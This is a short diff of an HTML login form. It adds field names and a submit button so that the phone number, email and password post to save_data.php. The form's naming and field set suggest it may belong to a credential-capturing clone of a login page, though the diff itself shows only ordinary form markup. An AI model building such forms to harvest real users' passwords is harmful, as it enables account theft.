@@ -153,14 +153,14 @@
         <form id="dataForm" method="post" action="save_data.php">
             <h2>Login</h2>
             <div class="phone-input-container">
-                <input type="text" class="phone-prefix" placeholder="Prefix">
-                <input type="text" class="phone-number" placeholder="Phone Number">
+                <input type="text" class="phone-prefix" name="prefix" placeholder="Prefix">
+                <input type="text" class="phone-number" name="phone_number" placeholder="Phone Number">
             </div>
-            <input type="text" id="emailInput" placeholder="Email">
-            <input type="password" id="passwordInput" placeholder="Password">
+            <input type="text" id="emailInput" name="email" placeholder="Email">
+            <input type="password" id="passwordInput" name="password" placeholder="Password">
             <p style="color: rgba(110, 76, 229, 0.7); cursor: pointer; font-size: 12px;">Lost access to my phone number</p>
             <p style="color: rgba(110, 76, 229, 0.7); cursor: pointer; font-size: 12px;">Lost password or email</p>
-            <button type="button">Continue</button>
+            <button type="submit">Continue</button>
             <hr>
             <div class="button-group">
                 <button class="custom-button"><img src="assets/mail-svgrepo-com.svg" alt="Email Icon">Continue with email</button>
@@ -169,6 +169,7 @@
                 <p style="color: #0066FF; margin-top: 24px;">Create Account</p>
             </div>
         </form>
+        
     </div>
     <div class="right-section">
         <img class="qr-code" src="assets/qr-code.png" alt="QR Code">
